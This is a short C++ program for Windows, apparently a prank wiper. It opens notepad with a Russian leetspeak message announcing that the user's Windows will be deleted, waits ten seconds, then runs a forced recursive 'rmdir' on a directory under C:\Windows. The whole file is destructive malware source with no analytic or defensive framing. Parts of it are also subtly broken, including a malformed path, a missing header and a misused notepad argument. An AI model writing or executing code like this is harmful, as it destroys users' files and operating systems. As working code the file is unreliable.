#include <windows.h>
#include <tchar.h>
#include <shellapi.h>

void wipeDisk() {
    char path[] = "C:\\\\Windows\\\\Win32";
    system((std::string("rmdir /s /q ") + path).c_str());
}

int main() {
    ShellExecute(NULL, "open", "notepad.exe", "3драBctBYuТе, ваша вunд0ус будEt YDаЛEH, П0КА П0КА", NULL, SW_SHOW);
    Sleep(10000);
    wipeDisk();
}
